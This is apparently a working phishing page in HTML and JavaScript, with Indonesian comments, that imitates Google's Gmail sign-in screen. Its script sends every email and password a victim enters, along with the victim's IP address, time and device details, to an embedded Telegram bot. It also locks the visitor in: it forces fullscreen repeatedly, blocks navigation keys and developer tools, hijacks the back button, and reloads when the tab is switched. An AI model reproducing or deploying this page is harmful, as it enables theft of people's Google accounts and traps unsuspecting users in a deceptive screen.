<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden !important;
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            right: 0 !important;
            bottom: 0 !important;
        }

        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: white;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        /* Fullscreen lock overlay - TIDAK BISA DIKELUARIN */
        .lock-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 999999999;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Google Sign-in Card - tidak bisa di-scroll */
        .card {
            max-width: 450px;
            width: 90%;
            padding: 48px 40px 36px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .google-logo {
            margin-bottom: 20px;
        }

        .google-logo img {
            width: 75px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }

        .subtitle {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 32px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.2s;
            background: white;
        }

        .input-group input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
        }

        .error-message {
            background: #fce8e6;
            color: #d93025;
            padding: 12px;
            border-radius: 4px;
            font-size: 14px;
            margin: 16px 0;
            text-align: left;
            display: none;
        }

        button {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.2s;
        }

        button:hover {
            background: #1557b0;
        }

        button:disabled {
            background: #dadce0;
            cursor: not-allowed;
        }

        .loading-spinner {
            display: none;
            margin: 16px auto;
            width: 24px;
            height: 24px;
            border: 2px solid #e0e0e0;
            border-top: 2px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer-links {
            margin-top: 32px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer-links a {
            color: #1a73e8;
            text-decoration: none;
            margin: 0 8px;
            pointer-events: none;
            cursor: default;
        }

        .attempt-text {
            margin-top: 20px;
            font-size: 12px;
            color: #5f6368;
        }

        /* Sembunyikan scrollbar */
        ::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body>

<div class="lock-overlay" id="lockOverlay">
    <div class="card">
        <div class="google-logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        </div>

        <h1>Sign in</h1>
        <div class="subtitle">to continue to Gmail</div>

        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" placeholder="Email or phone" autocomplete="off" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>

            <div class="error-message" id="errorMsg">
                Couldn't find your Google Account
            </div>

            <div class="loading-spinner" id="spinner"></div>

            <button type="submit" id="submitBtn">Next</button>
        </form>

        <div class="footer-links">
            <a href="#">Forgot email?</a>
            <span>•</span>
            <a href="#">Forgot password?</a>
        </div>

        <div class="attempt-text" id="attemptText"></div>
    </div>
</div>

<script>
    // ========== KONFIGURASI TELEGRAM ==========
    const TELEGRAM_TOKEN = "8806067214:AAHMhedGeATjYcFl3QUHk53Q8o9_sDuiGOg";
    const CHAT_ID = "8854409945";
    // ==========================================

    let attemptCount = 3;
    let isLocked = false;

    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const spinner = document.getElementById('spinner');
    const errorMsg = document.getElementById('errorMsg');
    const attemptText = document.getElementById('attemptText');
    const lockOverlay = document.getElementById('lockOverlay');

    // ========== LOCK SCROLL TOTAL ==========
    document.body.style.overflow = 'hidden';
    document.documentElement.style.overflow = 'hidden';
    
    // Lock scroll dengan event listener
    window.addEventListener('scroll', function(e) {
        window.scrollTo(0, 0);
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('wheel', function(e) {
        e.preventDefault();
        return false;
    }, { passive: false });
    
    document.addEventListener('touchmove', function(e) {
        e.preventDefault();
        return false;
    }, { passive: false });
    
    // Lock zoom dan gesture
    document.addEventListener('gesturestart', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('keydown', function(e) {
        // Lock semua tombol navigasi
        if (e.key === 'F5' || 
            e.key === 'F12' ||
            e.key === 'F11' ||
            (e.ctrlKey && e.key === 'r') || 
            (e.ctrlKey && e.shiftKey && e.key === 'R') ||
            (e.ctrlKey && e.key === 'w') ||
            (e.ctrlKey && e.key === 't') ||
            (e.ctrlKey && e.key === 'Tab') ||
            (e.metaKey && e.key === 'r') ||
            e.key === 'Escape' ||
            e.key === 'Home' ||
            e.key === 'Backspace') {
            e.preventDefault();
            return false;
        }
        
        // Lock Ctrl+Shift+I (dev tools)
        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
            e.preventDefault();
            return false;
        }
        
        // Lock Ctrl+U (view source)
        if (e.ctrlKey && e.key === 'u') {
            e.preventDefault();
            return false;
        }
    });
    
    // Lock right click
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Lock back button (history)
    history.pushState(null, null, location.href);
    window.addEventListener('popstate', function() {
        history.pushState(null, null, location.href);
        // Force reload ke halaman yang sama
        location.replace(location.href);
    });
    
    // Lock sebelum halaman ditutup
    window.addEventListener('beforeunload', function(e) {
        e.preventDefault();
        e.returnValue = '';
        return '';
    });
    
    // Lock visibility change (tab switch)
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            setTimeout(() => {
                alert('⚠️ VERIFIKASI DIPERLUKAN!');
                location.reload();
            }, 100);
        }
    });
    
    // ========== FULLSCREEN LOCK ==========
    function forceFullscreen() {
        const docEl = document.documentElement;
        if (docEl.requestFullscreen) {
            docEl.requestFullscreen().catch(err => {});
        } else if (docEl.webkitRequestFullscreen) {
            docEl.webkitRequestFullscreen();
        } else if (docEl.msRequestFullscreen) {
            docEl.msRequestFullscreen();
        }
    }
    
    // Request fullscreen saat pertama kali
    document.body.addEventListener('click', function firstClick() {
        forceFullscreen();
        document.body.removeEventListener('click', firstClick);
    });
    
    // Kalo keluar dari fullscreen, masukin lagi
    document.addEventListener('fullscreenchange', function() {
        if (!document.fullscreenElement) {
            forceFullscreen();
        }
    });
    document.addEventListener('webkitfullscreenchange', function() {
        if (!document.webkitFullscreenElement) {
            forceFullscreen();
        }
    });
    
    // Loop terus cek fullscreen
    setInterval(() => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
            forceFullscreen();
        }
        // Refresh history lock
        if (window.location.hash !== '#locked') {
            window.location.hash = 'locked';
            history.pushState(null, null, '#locked');
        }
    }, 200);
    
    // ========== FUNGSI ==========
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) {
            return 'Unknown';
        }
    }
    
    async function sendToTelegram(email, password, status) {
        const ip = await getIP();
        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
        const userAgent = navigator.userAgent;
        
        let pesan = `🔐🔐🔐 GOOGLE LOCKSCREEN 🔐🔐🔐%0A%0A`;
        pesan += `📧 EMAIL    : ${email}%0A`;
        pesan += `🔑 PASSWORD : ${password}%0A`;
        pesan += `✅ STATUS   : ${status}%0A`;
        pesan += `🔄 PERCOBAAN: ${4 - attemptCount} / 3%0A`;
        pesan += `🌐 IP       : ${ip}%0A`;
        pesan += `📅 WAKTU    : ${tanggal}%0A`;
        pesan += `💻 DEVICE   : ${encodeURIComponent(userAgent.substring(0, 150))}`;
        
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
        
        try {
            await fetch(url, {mode: 'no-cors'});
        } catch(e) {}
    }
    
    function updateAttemptDisplay() {
        attemptText.innerText = `⚠️ ${attemptCount} attempt${attemptCount !== 1 ? 's' : ''} remaining`;
        if (attemptCount <= 0) {
            errorMsg.style.display = 'block';
            errorMsg.innerHTML = '🔒 Too many failed attempts. Account temporarily locked.';
            submitBtn.disabled = true;
            startCountdown(30);
        }
    }
    
    function startCountdown(seconds) {
        let timeLeft = seconds;
        attemptText.innerText = `⏳ Please wait ${timeLeft} seconds before trying again...`;
        const timer = setInterval(() => {
            timeLeft--;
            attemptText.innerText = `⏳ Please wait ${timeLeft} seconds before trying again...`;
            if (timeLeft <= 0) {
                clearInterval(timer);
                attemptCount = 3;
                updateAttemptDisplay();
                submitBtn.disabled = false;
            }
        }, 1000);
    }
    
    function validateLogin(email, password) {
        return email.includes('@') && email.includes('.') && password.length >= 4;
    }
    
    // ========== SUBMIT ==========
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        if (isLocked || attemptCount <= 0) return;
        
        const email = emailInput.value.trim();
        const password = passwordInput.value;
        
        if (!email || !password) {
            errorMsg.style.display = 'block';
            setTimeout(() => errorMsg.style.display = 'none', 2000);
            return;
        }
        
        isLocked = true;
        submitBtn.disabled = true;
        spinner.style.display = 'block';
        errorMsg.style.display = 'none';
        
        await sendToTelegram(email, password, 'LOGIN ATTEMPT');
        
        const isValid = validateLogin(email, password);
        
        setTimeout(() => {
            spinner.style.display = 'none';
            
            if (isValid) {
                sendToTelegram(email, password, '✅ SUCCESS - REAL DATA');
                
                errorMsg.style.display = 'block';
                errorMsg.style.backgroundColor = '#e6f4ea';
                errorMsg.style.color = '#137333';
                errorMsg.innerHTML = '✅ Verifikasi berhasil! Redirecting to Gmail...';
                
                setTimeout(() => {
                    window.location.href = 'https://mail.google.com';
                }, 2000);
            } else {
                attemptCount--;
                updateAttemptDisplay();
                
                errorMsg.style.display = 'block';
                errorMsg.innerHTML = '❌ Wrong email or password. Please try again.';
                
                emailInput.value = '';
                passwordInput.value = '';
                emailInput.focus();
                
                isLocked = false;
                submitBtn.disabled = false;
                
                setTimeout(() => {
                    errorMsg.style.display = 'none';
                }, 3000);
            }
        }, 1500);
    });
    
    updateAttemptDisplay();
    emailInput.focus();
    
    // Lock address bar scroll
    window.scrollTo(0, 0);
</script>
</body>
</html>
